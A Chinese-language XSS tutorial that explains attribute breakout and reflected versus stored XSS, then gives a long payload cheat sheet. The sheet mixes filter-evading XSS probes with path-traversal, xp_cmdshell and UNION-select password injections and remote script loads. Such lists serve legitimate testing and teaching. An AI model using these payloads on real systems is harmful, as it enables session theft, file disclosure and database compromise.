## 跨站脚本攻击(Cross Site Scripting)
跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。

### 工具
- [Tamper data](#)
- [Hackbar](#)

### XSS 是如何发生的呢
假如有下面一个textbox
```html
<input type="text" name="address1" value="value1from">
```
value1from是来自用户的输入，如果用户不是输入value1from,而是输入` "/><script>alert(document.cookie)</script><!- ` 那么就会变成
```html
<input type="text" name="address1" value=""/><script>alert(document.cookie)</script><!- ">
```
嵌入的JavaScript代码将会被执行
 

或者用户输入的是 ` "onfocus="alert(document.cookie) ` 那么就会变成 
```html
<input type="text" name="address1" value="" onfocus="alert(document.cookie)">
```
 事件被触发的时候嵌入的JavaScript代码将会被执行
 攻击的威力，取决于用户输入了什么样的脚本

当然用户提交的数据还可以通过QueryString(放在URL中)和Cookie发送给服务器.
```text
http://example.com/test.php?id=<script>alert(document.cookie)</script>
```
还有另一种方式，url编码
```text
http://example.com/test.php?id=%3Cscript%3Ealert%28%27test%20xss%21%27%29%3B%3C%2fscript%3E
```
除了上面的编码方式，还有以下对应的编码方式，如果在做数据过滤的时候只是简单的过滤可能未必真正达到防御xss
```text
---------------------------------------------------------
| HTML Characters | HTML Encoded Entities | URL Encoded |
---------------------------------------------------------
| <               | &lt;                  | %3C         |
---------------------------------------------------------
| >               | &gt;                  | %3E         |
---------------------------------------------------------
| &               | &amp;                 | %26         |
---------------------------------------------------------
| '               | &#039;                | %27         |
---------------------------------------------------------
| "               | &quot;                | %22         |
---------------------------------------------------------
| space           | &nbsp;                | %20         |
---------------------------------------------------------
| more            | more                  | more        |
---------------------------------------------------------
```
### 反射型XSS
简单的理解就是用户输入的数据未做过滤，或者是一个用户的请求传递的数据参数未过滤，如果用户输入一段javascript或者html代码，则可以做一系列的操作。

### 存储型XSS
简单的理解就是一段Html、JavaScript代码存储在数据库中或者可以说持久化的数据，通过用户访问读取数据显示在html页面中，达到xss攻击。

### XSS代码书写方式(来自网络)
```text
'><script>alert(document.cookie)</script>
='><script>alert(document.cookie)</script>
<script>alert(document.cookie)</script>
<script>alert(vulnerable)</script>
%3Cscript%3Ealert('XSS')%3C/script%3E
<script>alert('XSS')</script>
<img src="javascript:alert('XSS')">
%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
%22%3cscript%3ealert(%22xss%22)%3c/script%3e
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
%3f.jsp
%3f.jsp
<script>alert('Vulnerable');</script>
<script>alert('Vulnerable')</script>
?sql_debug=1
a%5c.aspx
a.jsp/<script>alert('Vulnerable')</script>
a/
a?<script>alert('Vulnerable')</script>
"><script>alert('Vulnerable')</script>
';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&&
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
%3Cscript%3Ealert(document. domain);%3C/script%3E&
%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=
1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=
http://example.com/http://example.com/http://example.com/http://example.com/etc/passwd
..\..\..\..\..\..\..\..\windows\system.ini
\..\..\..\..\..\..\..\..\windows\system.ini
'';!--"<XSS>=&{()}
<IMG src="javascript:alert('XSS');">
<IMG src=javascript:alert('XSS')>
<IMG src=JaVaScRiPt:alert('XSS')>
<IMG src=JaVaScRiPt:alert("XSS")>
<IMG src=javascript:alert('XSS')>
<IMG src=javascript:alert('XSS')>
<IMG src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG src="jav ascript:alert('XSS');">
<IMG src="jav ascript:alert('XSS');">
<IMG src="jav ascript:alert('XSS');">
"<IMG src=java\0script:alert(\"XSS\")>";' > out
<IMG src=" javascript:alert('XSS');">
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND src="javascript:alert('XSS');">
<br size="&{alert('XSS')}">
<LAYER src="http://example.com/a.js"></layer>
<LINK REL="stylesheet" href="javascript:alert('XSS');">
<IMG src='vbscript:msgbox("XSS")'>
<IMG src="mocha:[code]">
<IMG src="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME src=javascript:alert('XSS')></IFRAME>
<FRAMESET><FRAME src=javascript:alert('XSS')></FRAME></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="behaviour: url('http://example.com/exploit.html');">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE='xss:expre\ssion(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A class="XSS"></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE href="javascript:alert('XSS');//">
getURL("javascript:alert('XSS')")
a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
<XML src="javascript:alert('XSS');">
"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
<SCRIPT src="http://example.com/xss.jpg"></SCRIPT>
<IMG src="javascript:alert('XSS')"
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://example.com/a.js></SCRIPT>'"-->
<IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<SCRIPT a=">" src="http://example.com/a.js"></SCRIPT>
<SCRIPT =">" src="http://example.com/a.js"></SCRIPT>
<SCRIPT a=">" '' src="http://example.com/a.js"></SCRIPT>
<SCRIPT "a='>'" src="http://example.com/a.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://example.com/a.js"></SCRIPT>
<A href=http://www.gohttp://www.google.com/ogle.com/>link</A>
```